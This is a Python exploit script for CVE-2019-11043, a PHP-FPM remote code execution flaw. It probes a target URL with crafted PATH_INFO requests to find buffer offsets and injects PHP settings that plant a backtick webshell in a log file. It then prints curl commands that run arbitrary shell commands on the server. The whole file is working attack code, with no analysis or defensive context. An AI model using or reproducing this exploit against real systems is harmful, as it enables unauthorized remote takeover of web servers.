import requests, argparse, sys, time

def inlineopts():
	""" Parsing command args """
	parser = argparse.ArgumentParser()

	parser.add_argument(    "--url",
		help='Target URL (ex: http://localhost/index.php)',
		type=str,
		required=True)

	parser.add_argument(    "--verbose",
		help='show verbose output',
		action="store_true",
		required=False)

	parser.add_argument(    "--skip-rce",
		help='just test the vulnerability',
		action="store_true",
		required=False)

	parser.add_argument(    "--reset",
		help='reset all injected settings',
		action="store_true",
		required=False)

	return parser.parse_args()

opt = inlineopts()

hash_strndup="Ebut"

php_settings = [
	"short_open_tag=1;;;;;;;",
	"html_errors=0;;;;;;;;;;",
	"include_path=/tmp;;;;;;",
	"auto_prepend_file=a;;;;",
	"log_errors=1;;;;;;;;;;;",
	"error_reporting=2;;;;;;",
	"error_log=/tmp/a;;;;;;;",
	"extension_dir=%22%3C%3F=%60%22;;;",
	"extension=%22$_GET%5Ba%5D%60%3F%3E%22",
]

rce_command = "a=/bin/sh+-c+'which+which'"
rce_check = "bin/which"

colors = {
	"green":"\033[1;32m",
	"off":"\033[0m"
}

pre_output = colors["green"]+"[*]"+colors["off"]
query_string_length = []
header_value_length = 1

for x in range(1500,1950):
	res = requests.get(opt.url+"/PHP%0Ainfooooooooooooooooooo.php?"+("U"*x), headers={"User-Agent":"CVE-2019-11043","Foo":"A", hash_strndup:"qazxs edcvf"})
	if res.status_code >= 500:
		if opt.verbose:
			print("(debug) qsl:"+str(x)+" status:"+str(res.status_code))
		query_string_length.append(x)

qsl_list = [(query_string_length[-1]-10), (query_string_length[-1]-5), query_string_length[-1]]
print("{} QSL candidate: {}".format(pre_output, ", ".join(str(x) for x in qsl_list)))

if opt.reset is True:
	print("{} Reset done.".format(pre_output))
	sys.exit()

r = True
for qslnum in qsl_list:
	while r:
		res = requests.get(
			opt.url+"/PHP_VALUE%0Asession.auto_start=1;;;?"+("U"*qslnum),
			headers={
				"User-Agent":"CVE-2019-11043",
				"Foo":("A"*header_value_length),
			hash_strndup:"qazxs edcvf"
		})

		if opt.verbose:
			print("(debug) Test headers value length (QSL:"+str(qslnum)+"): "+str(header_value_length));

		check = requests.get(
			opt.url+"/PHP_VALUE%0Asession.auto_start=1;;;?"+("U"*qslnum),
			headers={
				"User-Agent":"CVE-2019-11043",
				"Foo":("A"*header_value_length),
			hash_strndup:"qazxs edcvf"
		})

		if "Set-Cookie" in check.headers and "PHPSESSID" in check.headers["Set-Cookie"]:
			print("{} Target seems vulnerable (QSL:{}/HVL:{}): {}".format(
				pre_output,
				str(qslnum),
				str(header_value_length),
				check.headers["Set-Cookie"]
			))

			def_hvl = header_value_length
			def_qsl = qslnum

			r = False

			if opt.skip_rce is True:
				print("curl -H 'User-Agent: CVE-2019-11043' -H 'Foo: "+("A"*header_value_length)+"' -H 'Ebut: qazxs edcvf' '"+opt.url+"/PHP_VALUE%0Asession.auto_start=1;;;?"+("U"*qslnum)+"' ")
				sys.exit()

			break

		header_value_length = (header_value_length+1)

		if header_value_length > 556:
			header_value_length = 1
			break

	if r is False:
		break

try:
	def_hvl
except:
	print("[*] Target not vulnerable or something goes wrong...")
	sys.exit()

if opt.verbose:
	print("(debug) HVL:"+str(def_hvl));

for qslnum in qsl_list:
	res = requests.get(opt.url+"/PHP_VALUE%0Asession.auto_start=0;;;?"+("Q"*qslnum), headers={"User-Agent":"CVE-2019-11043","Foo":("A"*def_hvl), hash_strndup:"qazxs edcvf"})

for zz in range(qsl_list[0],(qsl_list[-1])):
	for setting in php_settings:
		intremove = (len(setting)+4)

		if opt.verbose:
			print("(debug) Inject> QSL:"+str(zz-intremove)+" HVL:"+str(def_hvl)+" setting:"+setting);

		res = requests.get(opt.url+"/PHP_VALUE%0A"+setting+"?"+rce_command+"&"+("Q"*(zz-intremove)), headers={"User-Agent":"CVE-2019-11043","Foo":("A"*def_hvl), "Ebut":"qazxs edcvf"})
		time.sleep(0.5)

		if rce_check in res.text:
			print(
					pre_output+" RCE successfully exploited!\n\n"+\
					"    You should be able to run commands using:\n"+\
					"    curl "+opt.url+"?a=bin/ls+/\n"
			)
			sys.exit()



for i in range(0,2):
	res = requests.get(opt.url+"?a=usr/bin/which+which")
	if rce_check in res.text:
		print(
			pre_output+" RCE successfully exploited!\n\n"+\
			"    You should be able to run commands using:\n"+\
			"    curl "+opt.url+"?a=bin/ls+/\n"
		)

		sys.exit()
